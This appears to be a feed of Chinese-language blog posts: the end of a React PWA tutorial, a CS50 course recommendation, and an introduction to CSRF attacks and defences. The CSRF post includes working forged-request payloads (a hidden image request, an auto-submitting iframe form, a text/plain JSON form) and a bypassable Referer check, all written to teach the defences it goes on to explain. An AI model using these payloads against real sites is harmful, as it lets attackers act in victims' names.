manifest.json&#123;    &quot;short_name&quot;: &quot;react-pwa-boilerplate&quot;,    &quot;name&quot;: &quot;react-pwa-boilerplate&quot;,    &quot;icons&quot;: [        &#123;            &quot;src&quot;: &quot;favicon.ico&quot;,            &quot;sizes&quot;: &quot;144x144&quot;,            &quot;type&quot;: &quot;image/png&quot;        &#125;    ],    &quot;start_url&quot;: &quot;./&quot;,    &quot;display&quot;: &quot;standalone&quot;&#125;

要注意的是，這邊的 icons，size 一定要給正確的值，否則會造成 manifest 的解析錯誤，另外，如果要能讓 iOS 內的 safari 也能夠跑，需要有額外的設定，待會還會提及，也可以先參考之前的 文章
Step III - index.html上述設定都做完後，要將 manifest.json 放入 index.html 內，並註冊 service-worker.js。
index.html&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;link rel=&quot;shortcut icon&quot; href=&quot;./src/favicon.ico&quot;&gt;    &lt;!-- manifest 加入這邊～ --&gt;    &lt;link rel=&quot;manifest&quot; href=&quot;manifest.json&quot;&gt;    &lt;title&gt;React App&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;    &lt;!-- service worker 在這邊註冊~ --&gt;    &lt;script&gt;        if (&#x27;serviceWorker&#x27; in navigator) &#123;            navigator.serviceWorker.register(&#x27;service-worker.js&#x27;).catch(function(ex) &#123;                console.warn(ex);                console.warn(&#x27;(This warning can be safely ignored outside of the production build.)&#x27;);            &#125;);        &#125;    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

Step IV - Deploy to github page搭配 github page 可以快速將你的 web app 部署上去，create-react-app 在你執行完 build 以後，提供了 deploy to github 的指令，我們可以把它先加入 package.json 當中。另外也一並加入 homepage 的欄位。
package.json&quot;scripts&quot;: &#123;    &quot;deploy&quot;: &quot;git commit -am \&quot;Save local changes\&quot;; git checkout -B gh-pages; git add -f build; git commit -am \&quot;Rebuild website\&quot;; git filter-branch -f --prune-empty --subdirectory-filter build; git push -f origin gh-pages; git checkout -&quot;,    &quot;start&quot;: &quot;react-scripts start&quot;,    &quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,    &quot;test&quot;: &quot;react-scripts test --env=jsdom&quot;,    &quot;eject&quot;: &quot;react-scripts eject&quot;  &#125;,  &quot;homepage&quot;: &quot;https://blog.arvinh.info/react-pwa-boilerplate&quot;

Step V - build &amp; deploy &amp; run and … debug?!如果你一步一步跟著做到這裡，理論上就可以 npm run build 來 build 看看，接著再 npm run deploy 來部署到 github page 上。
不過當你執行完，console 也沒有噴任何 error，將你的 web app 用手機開啟並加入主畫面後，重新開啟還是一樣進入瀏覽器的畫面？！
manifest path error仔細檢查一下瀏覽器 error 會發現在我們 build 出來的 index.html 內，manifest.json 的路徑被 parse 錯誤了！

這其實是因為目前 create-react-app 內部的 webpack loader 的 issue，在這個 issue 裡面有提到，目前我的解法是：

將一開始的 index.html 修改為 &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;
build 完以後，到 build&#x2F;index.html 內將其修正為 &lt;link rel=&quot;manifest&quot; href=&quot;./manifest.json&quot;&gt;

除了上面這個錯誤以外，以上步驟還少了一些東西。
iOS support如果你想要你的 web app 能夠在 iOS 上的 safari 運作，在 index.html 中還得要加入以下幾行：
index.html&lt;!-- Add to home screen for Safari on iOS --&gt;    &lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;    &lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;    &lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;React-PWA&quot;&gt;    &lt;link rel=&quot;apple-touch-icon&quot; href=&quot;./src/images/favicon-144x144.png&quot;&gt;
其中的 icon 路徑記得要填寫正確，也一樣要確認好 image 的 size。
Cache polyfill現在 service worker 的支援度還很低，有些 polyfill 可能需要加一下，但我還不確定到底需要哪些…
這個 Cache polyfill 用來增加 Cache api 的支援：
https://github.com/dominiccooney/cache-polyfill
修改你 pacakage.json 中的 build script，加上：
pacakage.json&quot;build&quot;: &quot;react-scripts build &amp;&amp; cp manifest.json cache-polyfill.js favicon.ico build/ &amp;&amp; sw-precache --navigate-fallback=&#x27;index.html&#x27; --root=&#x27;build/&#x27; --static-file-globs=&#x27;build/**/!(*map*)&#x27;&quot;,

並在你 build folder 內的 service-worker.js 內加上：
importScripts(&#39;cache-polyfill.js&#39;);
Run修正完上述錯誤後，執行 npm run deploy，應該就會自動幫你把 build folder 底下的內容部署到 gh-pages 這個 branch 上，你就能在 https:&#x2F;&#x2F;[your_github_acount].github.io&#x2F;[project_name]&#x2F; 看到你的 web app。
試著加入主畫面看看，如果沒問題的話，當你再次從主畫面點選 icon 開啟時，應該就可以看到你的網站像 app 一般的呈現在手機上了！
你可以先從 chrome devtool 確認 service worker 的運作情況，打開在 devtool 中的 Application tab (以前叫做 resources tab)
online:
offline:
可以看到 resource 在 offline 時是從 service worker 來。
手機上的狀況像是:




補充說明這篇文章講述到的 PWA support 實際上只能讓你的 web app 能跳脫瀏覽器，運作起來像個 Native App，但是並沒有考量其他實作 PWA 時需要注意的細節，像是 PWA 內的 App shell 等等。
另外，你的 web app 一定不可能只有 static files，勢必會需要有跟 API 溝通的部分，這邊就需要額外使用 sw-toolbox 來負責 runtime caching strategies，你也可以透過 sw-precache 的設定檔來處理：
precache-config.json&#123;dynamicUrlToDependencies: &#123;  dynamic/page1: [    &quot;app/views/layout.jade&quot;,    &quot;app/views/page1.jade&quot;  ],  dynamic/page2: [    &quot;app/views/layout.jade&quot;,    &quot;app/views/page2.jade&quot;  ]  &#125;,  staticFileGlobs: [    &quot;app/css/**.css&quot;,    &quot;app/**.html&quot;,    &quot;app/images/**.*&quot;,    &quot;app/js/**.js&quot;  ],  stripPrefix: &quot;app/&quot;,  verbose: true,  runtimeCaching: [    &#123;      urlPattern: &quot;/this\.is\.a\.regex/&quot;,      handler: &quot;networkFirst&quot;    &#125;  ]&#125;
只要在 sw-precache 的指令後加上 --config=sw-precache-config.json 這個 flag 來指定 config 檔即可。
程式碼上述完整程式碼可以在這裡取得：https://github.com/ArvinH/react-pwa-boilerplate
測試頁面：https://blog.arvinh.info/react-pwa-boilerplate/
目前測試似乎 offline 會有問題，會持續修正更新！並加入 react-router、redux 等常用 lib。
工商服務時間前陣子強者我朋友寫了一個神奇寶貝屬性對戰的遊戲，可以幫助你瞭解神奇寶貝之間各種屬性的相剋狀況，剛好是使用 create-react-app 與 Redux 實作，我也加入了 pwa 的版本，只是目前 offline 似乎有點問題…
歡迎大家幫忙修~
大家可以先到原本網站玩玩!
原版：https://kaddopur.github.io/type_instructor/
PWA：https://blog.arvinh.info/type_instructor/#/?_k=usu9f3

參考資料
Create-react-pwa
Google sw-precache
Cache-polyfill

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>react</tag>
        <tag>pwa</tag>
        <tag>Progressive web app</tag>
      </tags>
  </entry>
  <entry>
    <title>別猶豫了，來修 CS50 吧！</title>
    <url>/2017/11/11/cs50/</url>
    <content><![CDATA[前言其實我之前就已經寫過一篇文章（如海洋般的程式課程：CS50
）大力稱讚過 CS50，但那篇比較凌亂一點，比較像是自己的筆記。
今年再修了一次之後，依然覺得這門課很棒，決定再次跟大家分享。
CS50 是什麼？CS50 的課程名稱叫做 Introduction to Computer Science，是一堂哈佛大學的通識課程，總之就是一門在介紹 Computer Science 的課。
而這門課程的所有資料都有公開在網路上，也有在 edx 上面開課，可以跟著自己的進度來上。
除此之外，在 cs50.tv 也有課程的影片、逐字稿、作業等等的內容供大家自行取用。
CS50 這門課是「完全免費」的，但是在 edX 上面你可以選擇修完課之後付錢購買「修課證明」，意思就是你有修過這門課了並且得到官方認證。但是這個證明要不要花錢買完全是見仁見智，不買的話你還是可以免費修課。
CS50 的課程會教哪些？我列舉一下 2016 年秋季的課程的每一週的課程大綱：

Scratch
C
Arrays
Algorithms
Memory
Data Structures
HTTP
Machine Learning
Python
SQL
JavaScript

每一週的課程都有大概兩小時的影片跟一份要花你超級多時間的作業，但你從它的課程大綱就可以看出來，這門課教的東西非常非常多。
若你想知道得更詳細，我貼一下我之前修的那年（2015）的每一週的更詳細的大綱：
第零週二進位、ASCII、RGB、二分搜尋法介紹基本程式語言：條件判斷、變數、迴圈、陣列、函式作業：用 scratch 寫一個程式
第一週開始介紹 C 語言，以及講解 compile 的觀念介紹各種形態，像是 double, float, int, bool, char, long long…介紹浮點數誤差與 overflow教你 command line 基本操作，像是 mv, ls, cd, make 等等作業：寫一個簡單的 C 程式（迴圈印出星星）
第二週介紹 function, string, array以及如何利用 argc, argv 傳入參數還有講到加密，像是 RSA教了 command line 的 Redirecting（&gt;）還有 Pipe（|）作業：字串處理，簡單加解密實作  
第三週搜尋、排序（氣泡、插入、選擇、快排、合併）、big O遞迴、bit 操作GDB 的使用作業：實作O(n^2)的排序跟二分搜
第四週再次講解遞迴字串、指標、struct、bitmap 格式檔案處理（fprint&#x2F;fopen…）malloc，記憶體分配教你用 xxd 看檔案的 hex作業：給你 bitmap header 的文件，處理 bitmap 圖片，例如說放大兩倍
第五週深入講解記憶體與指標資料結構：linked list, queue, stack, tree, BST, tries, hashmap教你用 wget 抓檔案，以及如何寫 Makefile作業：實作字典樹或是 hashmap
第六週這週開始講跟網路有關的，包括：IP, IPv6, domain, nslookup, traceroute, 封包, ports, dns, vpn, http, request, response教你用chmod改檔案權限，以及curl抓網頁作業：用 C 寫一個 http server（的部份功能）
第七週chrome dev tool 的使用，像是看 html, request基本 html 與 css 教學php 簡介get&#x2F;post 參數介紹sql基本教學教你用apt-get安裝套件作業：完成簡單的 php 網頁以及與資料庫溝通
第八週示範重構程式碼，講解MVC的觀念教基本 SQL 語法有介紹到SQL Injection作業：串Google Map API，使用jQuery跟ajax做出互動性較高的網頁
第九週javascript 語法簡介json 格式講解DOM 模型event handler，事件機制  
CS50 值得推薦的另外一個點就是課程會不斷改進，像是我那年之後就把用 C 實作一個 http server 拿掉了，我猜測原因可能是這項作業太難。還有像是以前是學 PHP，現在課程教的是 Python。
每一年 CS50 都在進步，把不適當的作業跟內容拿掉換成新的，儘管我已經修過一次，修第二次的時候依然可以學到一些新東西。
為什麼推薦這門課？現在網路上其實已經有很多教學資源了，包括各式各樣的文章以及線上課程，可是這些課程有時候會有一個問題，那就是太零散。這邊一點、那邊一點，你修完這個之後還要去修別的才能補齊其他知識。
還有，半路轉職的人跟資工系本科出來的工程師有一個最大的差異：Computer Science 的相關知識。許多職業培訓班教的都只有工具，例如說 Ruby on Rails, PHP 等等，有很多學生結訓之後可以寫出一個網站，但卻完全不知道這樣為什麼可以。
所以常常會看到很多案例是培訓班出來的學生都被公司打槍，因為隨便問個很簡單的問題也回答不出來（但如果直接叫他們做網站，是做得出來的）。
而 CS50 這門課一次幫你補足了知識的廣度與深度。
如果你有認真修完，你會知道：

記憶體相關知識，像是 stack 跟 heap 的差別跟什麼是 stackoverflow
經典排序演算法，像是 bubble sort, merge sort 等等
基礎資料結構，stack, queue, hash table…
網路相關知識，像是 TCP&#x2F;IP, HTTP 等等

除此之外呢，你也會學到怎麼用 python + flask 寫出一個簡單的網站，藉此學習到網站開發相關知識，例如說：

cookie 與 session
web server
database 的使用
資訊安全相關知識，像是 sql injection

總而言之，不管你之後想走的是哪個領域的工程師，這堂課對你一定很有幫助。
誰適合這門課？我最推薦的族群是「正在上或是已經結業的培訓班學生」。
為什麼？
因為這門課的門檻真的不低。你看他要教這麼多東西，然後我又說他不只教的廣，還教的深，學生必須要投入很多時間在上面，才能取得相對應的回報。
如果是「完全新手」，幾乎沒有任何對程式的相關知識，當然還是可以修這門課，但我覺得一定會非常非常非常累，而且挫折感應該滿重的，因為這堂課真的不簡單。想要挑戰看看的話我也十分鼓勵，我敢保證你認真修完之後一定能學到很多東西。
對於那些已經有基礎程式知識的學生來說，這門課的門檻會稍微低一點，但前面五週都在上 C，還是很有挑戰性。之後幾週上 Web 相關的才會比較輕鬆一點。
我心動了，那應該怎麼開始？最簡單的方法就是去 edX 上面註冊，然後根據上面給的指示開始修課，其實就跟你修其他的開放式課程一樣。
但如果你想先體驗看看，可以直接到 Youtube 去看課程影片，看完之後再決定要不要修課。
在這邊要提醒大家，我覺得 CS50 課程的精華在於作業，如果你只是想看看影片，但你大概只能學到這堂課的一半，因為另外一半都在作業裡了。請大家務必做作業，學程式這種東西光看是不行的，一定要下去動手做才會更有感覺。
之前為了鼓勵更多人來修 CS50，我有做了一系列的導讀，每一週都有一支導讀影片，主要就是聽我稍微再講一下這一週的重點以及做一點小補充。導讀影片的話也可以到 Youtube 上面看。
每一次導讀完我都有把心得記錄下來，想看心得的話可以到這邊。
結論CS50 以非常生活化而且盡量簡單的方式講授艱澀的電腦科學相關知識，對我本身的教學理念以及風格影響深遠。這門課給了我很多教學上的啟發，讓我知道原來換個方式講，可以把一件事情解釋得清楚許多。
「如海洋般的程式課程」是我之前給它取的稱號，因為它「又深又廣」。講述的知識範圍既廣又同時兼顧了深度，真的是一門很棒的課程。
最後，再次推薦這門課給所有想要更瞭解 Computer Science 的人。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>cs50</tag>
      </tags>
  </entry>
  <entry>
    <title>讓我們來談談 CSRF</title>
    <url>/2017/02/25/csrf-introduction/</url>
    <content><![CDATA[Update:經過朋友指出文章中缺漏的地方，於 2&#x2F;26 早上新增一段講 SameSite Cookie 的段落。感謝 shik 的提點。
前言最近剛好碰到一些 CSRF 的案例，趁著這次機會好好研究了一下。深入研究之後才發現這個攻擊其實滿可怕的，因為很容易忽略它。但幸好現在有些 Framework 都有內建防禦 CSRF 的功能，可以很簡單的開啟。
但儘管如此，我認為還是有必要瞭解一下 CSRF 到底在幹嘛，是透過怎樣的手段攻擊，以及該如何防禦。就讓我們先來簡單的介紹一下它吧！
CSRF 是一種 Web 上的攻擊手法，全稱是 Cross Site Request Forgery，跨站請求偽造。不要跟 XSS 搞混了，他們兩種是不同的東西，那到底什麼是 CSRF 呢？先從我自身的一個案例談起好了。
偷懶的刪除功能以前我有做個一個簡單的後台頁面，就想成是一個部落格吧！可以發表、刪除以及編輯文章，介面大概長得像這樣：


可以看到刪除的那個按鈕，點下去之後就可以把一篇文章刪掉。當初因為偷懶，想說如果我把這個功能做成 GET，我就可以直接用一個連結完成刪除這件事，在前端幾乎不用寫到任何程式碼：
&lt;a href=&#x27;/delete?id=3&#x27;&gt;刪除&lt;/a&gt;

很方便對吧？然後我在網頁後端那邊做一下驗證，驗證 request 有沒有帶 session id 上來，也驗證這篇文章是不是這個 id 的作者寫的，都符合的話才刪除文章。
嗯，聽起來該做的都做了啊，我都已經做到：「只有作者本人可以刪除自己的文章」了，應該很安全了，難道還有哪裡漏掉了嗎？
沒錯，的確是「只有作者本人可以刪除自己的文章」，但如果他不是自己「主動刪除」，而是在不知情的情況下刪除呢？你可能會覺得我在講什麼東西，怎麼會有這種事情發生，不是作者主動刪的還能怎麼刪？
好，我就來讓你看看還能怎麼刪！
今天假設小黑是一個邪惡的壞蛋，想要讓小明在不知情的情況下就把自己的文章刪掉，該怎麼做呢？
他知道小明很喜歡心理測驗，於是就做了一個心理測驗網站，並且發給小明。但這個心理測驗網站跟其他網站不同的點在於，「開始測驗」的按鈕長得像這樣：
&lt;a href=&#x27;https://small-min.blog.com/delete?id=3&#x27;&gt;開始測驗&lt;/a&gt;

小明收到網頁之後很開心，就點擊「開始測驗」。點擊之後瀏覽器就會發送一個 GET 請求給https://small-min.blog.com/delete?id=3，並且因為瀏覽器的運行機制，一併把 small-min.blog.com 的 cookie 都一起帶上去。
Server 端收到之後檢查了一下 session，發現是小明，而且這篇文章也真的是小明發的，於是就把這篇文章給刪除了。
這就是 CSRF，你現在明明在心理測驗網站，假設是 https://test.com 好了，但是卻在不知情的狀況下刪除了 https://small-min.blog.com 的文章，你說這可不可怕？超可怕！
這也是為什麼 CSRF 又稱作 one-click attack 的緣故，你只要點一下就中招了。
你可能會說：「可是這樣小明不就知道了嗎，不就連過去部落格了？不符合『不知情的狀況』啊！」
好，那如果我們改成這樣呢：
&lt;img src=&#x27;https://small-min.blog.com/delete?id=3&#x27; width=&#x27;0&#x27; height=&#x27;0&#x27; /&gt;&lt;a href=&#x27;/test&#x27;&gt;開始測驗&lt;/a&gt;

在開啟頁面的同時，一樣發送一個刪除的 request 出去，但這次小明是真的完全不知道這件事情。這樣就符合了吧！
CSRF 就是在不同的 domain 底下卻能夠偽造出「使用者本人發出的 request」。要達成這件事也很簡單，因為瀏覽器的機制，你只要發送 request 給某個網域，就會把關聯的 cookie 一起帶上去。如果使用者是登入狀態，那這個 request 就理所當然包含了他的資訊（例如說 session id），這 request 看起來就像是使用者本人發出的。
那我把刪除改成 POST 不就好了嗎？沒錯，聰明！我們不要那麼懶，好好把刪除的功能做成 POST，這樣不就無法透過 &lt;a&gt; 或是 &lt;img&gt; 來攻擊了嗎？除非有哪個 HTML 元素可以發送 POST request！
有，正好有一個，就叫做 form。
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;開始測驗&quot;/&gt;&lt;/form&gt;

小明點下去以後，照樣中招，一樣刪除了文章。你可能又會疑惑說，但是這樣小明不就知道了嗎？我跟你一樣很疑惑，於是我 Google 到了這篇：Example of silently submitting a POST FORM (CSRF)
這篇提供的範例如下，網頁的世界真是博大精深：
&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&#x27;POST&#x27; action=&#x27;https://small-min.blog.com/delete&#x27; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&#x27;hidden&#x27; name=&#x27;id&#x27; value=&#x27;3&#x27;&gt;  &lt;input type=&#x27;submit&#x27; value=&#x27;submit&#x27;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;

開一個看不見的 iframe，讓 form submit 之後的結果出現在 iframe 裡面，而且這個 form 還可以自動 submit，完全不需要經過小明的任何操作。
到了這步，你就知道改成 POST 是沒用的。
那我後端改成只接收 json 呢？聰明的你靈機一動：「既然在前端只有 form 可以送出 POST 的話，那我的 api 改成用 json 收資料不就可以了嗎？這樣總不能用 form 了吧！」
spring 的 document告訴你：這還是沒用的！
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot;&gt;&lt;input name=&#x27;&#123;&quot;id&quot;:3, &quot;ignore_me&quot;:&quot;&#x27; value=&#x27;test&quot;&#125;&#x27; type=&#x27;hidden&#x27;&gt;&lt;input type=&quot;submit&quot;  value=&quot;delete!&quot;/&gt;&lt;/form&gt;

這樣子會產生如下的 request body：
&#123; &quot;id&quot;: 3,&quot;ignore_me&quot;: &quot;=test&quot;&#125;

但這邊值得注意的一點是，form能夠帶的 content type 只有三種：application/x-www-form-urlencoded, multipart/form-data 跟 text/plain。在上面的攻擊中我們用的是最後一種，text/plain，如果你在你的後端 Server 有檢查這個 content type 的話，是可以避免掉上面這個攻擊的。
只是，上面這幾個攻擊我們都還沒講到一種情況：如果你的 api 接受 cross origin 的 request 呢？
意思就是，如果你的 api 的 Access-Control-Allow-Origin 設成 * 的話，代表任何 domain 都可以發送 ajax 到你的 api server，這樣無論你是改成 json，或甚至把 method 改成 PUT, DELETE 都沒有用。
我們舉的例子是刪除文章，這你可能覺得沒什麼，那如果是銀行轉帳呢？攻擊者只要在自己的網頁上寫下轉帳給自己帳號的 code，再把這個網頁散佈出去就好，就可以收到一大堆錢。
講了這麼多，來講該怎麼防禦吧！先從最簡單的「使用者」開始講。
使用者的防禦CSRF 攻擊之所以能成立，是因為使用者在被攻擊的網頁是處於已經登入的狀態，所以才能做出一些行為。雖然說這些攻擊應該由網頁那邊負責處理，但如果你真的很怕，怕網頁會處理不好的話，你可以在每次使用完網站就登出，就可以避免掉 CSRF。
或者呢，關閉執行 js 或把上面這些 pattern 的程式碼過濾掉不要執行，也是一個方法（但應該很難判定哪些是 CSRF 攻擊的程式碼）。
所以使用者能做的其實有限，真的該做事的是 Server 那邊！
Server 的防禦CSRF 之所以可怕是因為 CS 兩個字：Cross Site，你可以在任何一個網址底下發動攻擊。CSRF 的防禦就可以從這個方向思考，簡單來說就是：「我要怎麼擋掉從別的 domain 來的 request」
你仔細想想，CSRF 的 reuqest 跟使用者本人發出的 request 有什麼區別？區別在於 domain 的不同，前者是從任意一個 domain 發出的，後者是從同一個 domain 發出的（這邊假設你的 api 跟你的前端網站在同一個 domain）
檢查 Refererrequest 的 header 裡面會帶一個欄位叫做 referer，代表這個 request 是從哪個地方過來的，可以檢查這個欄位看是不是合法的 domain，不是的話直接 reject 掉即可。
但這個方法要注意的地方有三個，第一個是有些瀏覽器可能不會帶 referer，第二個是有些使用者可能會關閉自動帶 referer 的這個功能，這時候你的 server 就會 reject 掉由真的使用者發出的 request。
第三個是你判定是不是合法 domain 的程式碼必須要保證沒有 bug，例如：
const referer = request.headers.referer;if (referer.indexOf(&#x27;small-min.blog.com&#x27;) &gt; -1) &#123;  // pass&#125;

你看出上面這段的問題了嗎？如果攻擊者的網頁是small-min.blog.com.attack.com的話，你的檢查就破功了。
所以，檢查 referer 並不是一個很完善的解法
加上圖形驗證碼、簡訊驗證碼等等就跟網路銀行轉帳的時候一樣，都會要你收簡訊驗證碼，多了這一道檢查就可以確保不會被 CSRF 攻擊。
圖形驗證碼也是，攻擊者並不知道圖形驗證碼的答案是什麼，所以就不可能攻擊了。
這是一個很完善的解決方法，但如果使用者每次刪除 blog 都要打一次圖形驗證碼，他們應該會煩死吧！
加上 CSRF token要防止 CSRF 攻擊，我們其實只要確保有些資訊「只有使用者知道」即可。那該怎麼做呢？
我們在 form 裡面加上一個 hidden 的欄位，叫做csrftoken，這裡面填的值由 server 隨機產生，並且存在 server 的 session 中。
&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;fj1iro2jro12ijoi1&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;刪除文章&quot;/&gt;&lt;/form&gt;

按下 submit 之後，server 比對表單中的csrftoken與自己 session 裡面存的是不是一樣的，是的話就代表這的確是由使用者本人發出的 request。這個 csrftoken 由 server 產生，並且每一段不同的 session 就應該要更換一次。
那這個為什麼可以防禦呢？因為攻擊者並不知道 csrftoken 的值是什麼，也猜不出來，所以自然就無法進行攻擊了。
可是有另外一種狀況，假設你的 server 支持 cross origin 的 request，會發生什麼事呢？攻擊者就可以在他的頁面發起一個 request，順利拿到這個 csrf token 並且進行攻擊。不過前提是你的 server 接受這個 domain 的 request。
接著讓我們來看看另外一種解法
Double Submit Cookie上一種解法需要 server 的 state，亦即 csrf token 必須被保存在 server 當中，才能驗證正確性。而現在這個解法的好處就是完全不需要 server 儲存東西。
這個解法的前半段與剛剛的相似，由 server 產生一組隨機的 token 並且加在 form 上面。但不同的點在於，除了不用把這個值寫在 session 以外，同時也讓 client side 設定一個名叫 csrftoken 的 cookie，值也是同一組 token。
Set-Cookie: csrftoken=fj1iro2jro12ijoi1&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;fj1iro2jro12ijoi1&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;刪除文章&quot;/&gt;&lt;/form&gt;

你可以仔細思考一下 CSRF 攻擊的 request 與使用者本人發出的 request 有什麼不一樣？不一樣的點就在於，前者來自不同的 domain，後者來自相同的 domain。所以我們只要有辦法區分出這個 request 是不是從同樣的 domain 來，我們就勝利了。
而 Double Submit Cookie 這個解法正是從這個想法出發。
當使用者按下 submit 的時候，server 比對 cookie 內的 csrftoken 與 form 裡面的 csrftoken，檢查是否有值並且相等，就知道是不是使用者發的了。
為什麼呢？假設現在攻擊者想要攻擊，他可以隨便在 form 裡面寫一個 csrf token，這當然沒問題，可是因為瀏覽器的限制，他並不能在他的 domain 設定 small-min.blog.com 的 cookie 啊！所以他發上來的 request 的 cookie 裡面就沒有 csrftoken，就會被擋下來。
當然，這個方法看似好用，但也是有缺點的，可以參考：Double Submit Cookies vulnerabilities，攻擊者如果掌握了你底下任何一個 subdomain，就可以幫你來寫 cookie，並且順利攻擊了。
client side 的 Double Submit Cookie會特別提到 client side，是因為我之前所碰到的專案是 Single Page Application，上網搜尋一下就會發現有人在問：「SPA 該如何拿到 CSRF token？」，難道要 server 再提供一個 api 嗎？這樣好像有點怪怪的。
但是呢，我認為我們可以利用 Double Submit Cookie 的精神來解決這個問題。而解決這問題的關鍵就在於：由 client side 來生 csrf token。就不用跟 server api 有任何的互動。
其他的流程都跟之前一樣，生成之後放到 form 裡面以及寫到 cookie。或者說如果你是 SPA 的話，也可以把這資訊直接放到 request header，你就不用在每一個表單都做這件事情，只要統一加一個地方就好。
事實上，我自己常用的 library axios 就有提供這樣的功能，你可以設置 header 名稱跟 cookie 名稱，設定好以後你每一個 request，它都會自動幫你把 header 填上 cookie 裡面的值。
 // `xsrfCookieName` is the name of the cookie to use as a value for xsrf tokenxsrfCookieName: &#x27;XSRF-TOKEN&#x27;, // default// `xsrfHeaderName` is the name of the http header that carries the xsrf token valuexsrfHeaderName: &#x27;X-XSRF-TOKEN&#x27;, // default

那為什麼由 client 來生這個 token 也可以呢？因為這個 token 本身的目的其實不包含任何資訊，只是為了「不讓攻擊者」猜出而已，所以由 client 還是由 server 來生成都是一樣的，只要確保不被猜出來即可。Double Submit Cookie 靠的核心概念是：「攻擊者的沒辦法讀寫目標網站的 cookie，所以 request 的 csrf token 會跟 cookie 內的不一樣」
browser 本身的防禦我們剛剛提到了使用者自己可以做的事、網頁前後端可以做的事情，那瀏覽器呢？之所以能成立 CSRF，是因為瀏覽器的機制所導致的，有沒有可能從瀏覽器方面下手，來解決這個問題呢？
有！而且已經有了。而且啟用的方法非常非常簡單。
Google 在 Chrome 51 版的時候正式加入了這個功能：SameSite cookie，對詳細運行原理有興趣的可參考：draft-west-first-party-cookies-07。
先引一下 Google 的說明：

Same-site cookies (ne “First-Party-Only” (ne “First-Party”)) allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain.

啟用這個功能有多簡單？超級無敵簡單。
你原本設置 Cookie 的 header 長這樣：
Set-Cookie: session_id=ewfewjf23o1;

你只要在後面多加一個 SameSite 就好：
Set-Cookie: session_id=ewfewjf23o1; SameSite

但其實 SameSite 有兩種模式，Lax跟Strict，默認是後者，你也可以自己指定模式：
Set-Cookie: session_id=ewfewjf23o1; SameSite=StrictSet-Cookie: foo=bar; SameSite=Lax

我們先來談談默認的 Strict模式，當你加上 SameSite 這個關鍵字之後，就代表說「我這個 cookie 只允許 same site 使用，不應該在任何的 cross site request 被加上去」。
意思就是你加上去之後，我們上面所講的&lt;a href=&quot;&quot;&gt;, &lt;form&gt;, new XMLHttpRequest，只要是瀏覽器驗證不是在同一個 site 底下發出的 request，全部都不會帶上這個 cookie。
可是這樣其實會有個問題，連&lt;a href=&quot;...&quot;都不會帶上 cookie 的話，當我從 Google 搜尋結果或者是朋友貼給我的連結點進某個網站的時候，因為不會帶 cookie 的關係，所以那個網站就會變成是登出狀態。這樣子的使用者體驗非常不好。
有兩種解法，第一種是跟 Amazon 一樣，準備兩組不同的 cookie，第一組是讓你維持登入狀態，第二組則是做一些敏感操作的時候會需要用到的（例如說購買、設定帳戶等等）。第一組不設定 SameSite，所以無論你從哪邊來，都會是登入狀態。但攻擊者就算有第一組 cookie 也不能幹嘛，因為不能做任何操作。第二組因為設定了 SameSite 的緣故，所以完全避免掉 CSRF。
但這樣子還是有點小麻煩，所以你可以考慮第二種，就是調整為 SameSite 的另一種模式：Lax。
Lax 模式放寬了一些限制，例如說&lt;a&gt;, &lt;link rel=&quot;prerender&quot;&gt;, &lt;form method=&quot;GET&quot;&gt; 這些都還是會帶上 cookie。但是 POST 方法 的 form，或是只要是 POST, PUT, DELETE 這些方法，就不會帶上 cookie。
所以一方面你可以保有彈性，讓使用者從其他網站連進你的網站時還能夠維持登入狀態，一方面也可以防止掉 CSRF 攻擊。但 Lax 模式之下就沒辦法擋掉 GET 形式的 CSRF，這點要特別注意一下。
講到這種比較新的東西，相信大家一定都很想知道瀏覽器的支援度如何，caniuse 告訴我們說：目前只有 Chrome 支援這個新的特性（畢竟是 Google 自己推的方案，自己當然要支持一下）。
雖然瀏覽器的支援度不太高，但日後其他瀏覽器可能也會跟進實做這個方案，不妨在現在就把 SameSite 加上去，以後就不用再為 CSRF 煩惱了。
我其實只是大略的介紹一下，draft-west-first-party-cookies-07 裡面講到很多細節，例如說到底怎樣算是 cross site? 一定要在同一個 domain 嗎？那 sub domain 行不行？
好奇的可以自己研究一下，或者是這篇：SameSite Cookie，防止 CSRF 攻击也有提到。
SameSite 相關的參考資料：

